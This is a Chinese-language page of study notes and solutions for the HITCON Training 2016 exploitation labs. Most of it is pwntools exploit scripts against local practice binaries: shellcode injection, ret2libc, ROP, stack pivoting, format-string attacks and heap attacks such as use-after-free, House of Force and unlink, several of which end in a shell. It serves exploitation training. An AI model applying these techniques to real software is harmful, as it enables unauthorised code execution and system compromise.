# Angelboy_HITCON_Training_2016 - Notes
> 前言:
>
> 其實每個 lab 下都有解答了，純粹紀錄和學習下，然後應該也不歸類在 wargame 就是，但不知道放哪

當初是看到這個[網站](https://veritas501.space/2017/05/23/HITCON-training%20writeup/)才知道的


> 目錄:
> * [lab1](#lab1)
> * [lab2](#lab2)
> * [lab3](#lab3)
> * [lab4](#lab4)
> * [lab5](#lab5)
> * [lab6](#lab6)
> * [lab7](#lab7)
> * [lab8](#lab8)
> * [lab9](#lab9)
> * [lab10](#lab10)
> * [lab11-1](#lab11-1)
> * [lab11-2](#lab11-2)
> * [lab12](#lab12)
> * [lab13](#lab13)
> * [lab14](#lab14)
> * [lab15](#lab15)

lab1
---

單純 gdb 練習

```
gdb

b *get_flag+389
r
set $eax=$edx
c
```

lab2
---

保護都沒開，感覺就是 ret2shellcode

ida pro 看一下，就是輸入以後會直接執行，然後然後只允許 open/read/write

假設 flag 在當前目錄好了，就是 cat ./flag 這樣

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/HITCON-Training/LAB/lab2/orw.bin')

sh = open("a.bin", "rb").read()
r.sendlineafter(':', sh)


r.interactive()


"""
jmp sh
orw:
 pop ebx
 mov eax, 0x5
 xor ecx,ecx
 int 0x80

 mov ebx, eax
 mov eax, 0x3
 mov ecx, esp
 mov edx, 0x100
 int 0x80

 mov edx, eax
 mov eax, 0x4
 mov ebx, 0x1
 int 0x80

 mov eax, 0x1
 xor ebx, ebx
 int 0x80
sh:
 call orw
 db 'flag', 0
"""
```


lab3
---

這題名字就是 ret2shellcode @@ ，然後保護也沒開應該就是了

```
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/HITCON-Training/LAB/lab3/ret2sc')

name = 0x804a060
r.sendlineafter(':', asm(shellcraft.sh()))
r.sendlineafter(':', "a"*32 + p32(name))
r.interactive()
```

lab4
---

ret2libc 沒什麼好說的

```
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('./ret2lib')

puts_got = 134520860
puts_off = 0x005fca0
system_off = 0x0003ada0
r.sendlineafter('address (in dec) :', str(puts_got))
info(r.recvuntil('the address : '))
libc = int(r.recvuntil('\n')[:-1], 16) - puts_off
info("libc: "+hex(libc))
system = system_off + libc
sh = libc + 0x15BA0B
trash = 'a'*60
r.sendlineafter(':', trash + flat([system, sh, sh]))


r.interactive()
```


lab5
---

statically linked 下的 rop

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('./simplerop')
elf = ELF('./simplerop')
trash = 'a'*32
read = 0x0806CD50
bss = elf.bss()
pop3_ret = 0x0804838c
pop_eax = 0x080bae06
pop_ecx_ebx = 0x0806e851
pop_edx = 0x0806e82a
int0x80 = 0x080493e1
payload = trash + flat([read, pop3_ret, 0, bss, 0x10, pop_eax, 0xb, pop_ecx_ebx, 0, bss, pop_edx, 0])
payload += p32(int0x80)
r.sendafter(":", payload)
r.send('/bin/sh\x00')
r.interactive()
```


lab6
---

stack pivot ，因為 buf 不夠長，不過有給 libc 所以還是很簡單...

```
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('./a')
r.recvrepeat(0.2)

trash = 'a'*40
buf1 = 0x0804b000-0x100
buf2 = 0x0804b000-0x200
read = 134513536
puts = 134513548
puts_off = 0x5fca0
puts_got = 134520816
system_off = 0x003ada0
sh_off = 0x15BA0B
leave_ret = 0x08048418
pop1 = 0x0804836d # pop ebx ; ret

pad = trash + flat([buf1, read, leave_ret, 0, buf1, 100])
r.send(pad)

pad2= flat([buf2, puts, pop1, puts_got, read, leave_ret, 0, buf2, 100])
r.send(pad2)
libc = u32(r.recv(4)) - puts_off
print "libc: ",hex(libc)
system = system_off + libc
sh = libc + sh_off

r.recvrepeat(0.2)
pad3 = flat([0, system, sh, sh])
r.send(pad3)


r.interactive()
```

lab7
---

這題考基本的 format string vuln ，漏洞在
```
printf(buf);
```

所以先透過 format string vuln 來 Leak password ，在輸入就好

```
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = remote('127.0.0.1',1234)
r.recvrepeat(0.1)
password = 0x804a048
payload = p32(password) + "G%10$sG"
r.sendline(payload)
r.recvuntil('G')
s = u32(r.recvuntil('G')[:-1])
r.sendline(str(s))
r.interactive()
```


lab8
---

有二題

1. 寫 0xda
2. 寫 0xfaceb00c

第一個，直接寫 0xda
```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = remote('127.0.0.1', 1234)
info(r.recvrepeat(0.2))
raw_input("#")
magic = 0x804a038
r.sendline(p32(magic) + "%214c%7$hhn")
r.interactive()
```


第二個是寫 0xfaceb00c

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = remote('127.0.0.1', 1234)

def fmt(prev, value, idx):
	r = ""
	if prev < value:
		r += "%" + str(value - prev) + "c"
	elif prev > value:
		r += "%" + str(value - prev + 256) + "c"
	else:
		pass
	r += "%" + str(idx) + "$hhn"
	return r

magic = 0x0804a038
target = 0xfaceb00c
prev = 16
payload = ""
for i in range(4):
	payload += fmt(prev, (target >> i*8) & 0xff, 7 + i)
	prev = (target >> i*8) & 0xff

payload = ''.join(p32(magic + i) for i in range(4)) + payload
print "payload: ", repr(payload)

raw_input("#")
r.send(payload)

r.interactive()
```


lab9
---

lab10
---

Use After Free 的題目是先 F, A, U ，也就是 Free 後再 allocate 使 chunk 重複，之後再 Use

這題漏洞: del_note() 中沒將 free 後的設為 null 所以會有 UAF

看一下 Note 結構，大小是 8 bytes
```
struct note {
        void (*printnote)();
        char *content ;
};
```

malloc 一個的樣子大概是
```
+---------------------+
| note 結構: 16 bytes |
-----------------------
| 	 content size     |
+---------------------+
```

所以我們可以先 malloc 兩個，注意 content size 不可以是 16 bytes

再依序 free 後， malloc 一個 content size = 16 的 ，這樣就可以做 UAF

控制 func ptr 指到 magic()

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = remote('127.0.0.1', 1234)

def add_note(size, content):
	r.sendlineafter(':', str(1))
	r.sendlineafter(':', str(size))
	r.sendlineafter(':', content)

def del_note(idx):
	r.sendlineafter(':', str(2))
	r.sendlineafter(':', str(idx))

def print_note(idx):
	r.sendlineafter(':', str(3))
	r.sendlineafter(':', str(idx))

magic = 0x8048986

add_note(48, "a") # 0
add_note(48, "a") # 1
del_note(0)
del_note(1)
add_note(8, p32(magic))
print_note(0)
r.interactive()
```


lab11-1
---

考 House of Force

須滿足兩個條件:
1. heap overflow 改 top chunk size
2. 可以 malloc 任意大小

利用步驟:
1. heap overflow 將 top chunk size 改為 -1 (也就是最大)
2. malloc(-nb) 使的top chunk 位在 target - chunk_header
3. 再次 malloc 就可以改到 target

這題漏洞在 change_item()

他的size 不是使用原本的 size ，而是讓使用者重新輸入，所以有 heap overflow



那這題先找一下目標
```
struct box{
        void (*hello_message)();
        void (*goodbye_message)();
};
```

有兩個 func ptr ， goodbye_message 是結束會去呼叫的，所以可以將其設為target

然後程式裡面有
```
void magic(){
        int fd ;
        char buffer[100];
        fd = open("/home/bamboobox/flag",O_RDONLY);
        read(fd,buffer,sizeof(buffer));
        close(fd);
        printf("%s",buffer);
        exit(0);
}
```

所以就是將 target 改為 magic() 即可

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
r = remote('127.0.0.1', 1234)
def show():
	r.sendlineafter(':', str(1))

def add_item(length, name):
	r.sendlineafter(':', str(2))
	r.sendlineafter(':', str(length))
	r.sendlineafter(':', name)

def change_item(idx, length, name):
	r.sendlineafter(':', str(3))
	r.sendlineafter(':', str(idx))
	r.sendlineafter(':', str(length))
	r.sendlineafter(':', name)

def remove_item(idx):
	r.sendlineafter(':', str(4))
	r.sendlineafter(':', str(idx))

magic = 0x400d49
add_item(0x50, "a")# 0
change_item(0, 0x100, "a"*0x58 + p64(0xffffffffffffffff))
add_item(-0x90, "a")
add_item(32, flat(magic, magic))
r.interactive()
```


lab11-2
---

這題考 unlink

主要利用是可以把存 chunk1 的位址往前搬 0x18

這樣可以對chunk0 進行修改，做info leak / 任意位址寫

然後 fastbin 不會做 unlink ，所以大小不可以是 fastbin 的

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
r = remote('127.0.0.1', 1234)
def show():
	r.sendlineafter(':', str(1))

def add_item(length, name):
	r.sendlineafter(':', str(2))
	r.sendlineafter(':', str(length))
	r.sendlineafter(':', name)

def change_item(idx, length, name):
	r.sendlineafter(':', str(3))
	r.sendlineafter(':', str(idx))
	r.sendlineafter(':', str(length))
	r.sendlineafter(':', name)

def remove_item(idx):
	r.sendlineafter(':', str(4))
	r.sendlineafter(':', str(idx))

chk1_addr = 0x6020d8
atoi_got = 0x602068
atoi_off = 0x36e80
system_off = 0x0000000000045390
fake = flat([0, 0x81, chk1_addr-0x18, chk1_addr-0x10]) + 'a'*0x60
fake+= flat([0x80, 0x90])
add_item(0x80, "a") # 0
add_item(0x80, "a") # 1
add_item(0x80, "a") # 1
change_item(1, 0x100, fake)
remove_item(2)
change_item(1, 0x100, flat([0, atoi_got]))
show()
r.recvuntil('0 : ')
libc = u64(r.recvuntil('\x7f').ljust(8, '\x00')) - atoi_off
print "libc: ",hex(libc)
system = libc + system_off
change_item(0, 0x100, p64(system))
r.sendlineafter(':', 'sh')
r.interactive()
```

lab12
---

這題考 fastbin dup

delete 時沒有設為 null ，所以有 double free 漏洞

目標是跳 magic


lab13
---



lab14
---

考 unsorted bin attack ，改大 magic 就好

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
r = remote('127.0.0.1', 1234)

def create_heap(size, content):
	r.sendlineafter(':', str(1))
	r.sendlineafter(':', str(size))
	r.sendlineafter(':', content)

def edit_heap(idx, size, content):
	r.sendlineafter(':', str(2))
	r.sendlineafter(':', str(idx))
	r.sendlineafter(':', str(size))
	r.sendlineafter(':', content)

def del_heap(idx):
	r.sendlineafter(':', str(3))
	r.sendlineafter(':', str(idx))

magic = 0x6020c0
create_heap(0x20, "a") # 0
create_heap(0x80, "a") # 0
create_heap(0x20, "a") # 0
del_heap(1)
pay = "a"*0x20 + flat([0, 0x91, 0, magic - 0x10])
edit_heap(0, 0x100, pay)
create_heap(0x80, "a")
r.sendlineafter(':', str(4869))
r.interactive()
```


lab15
---







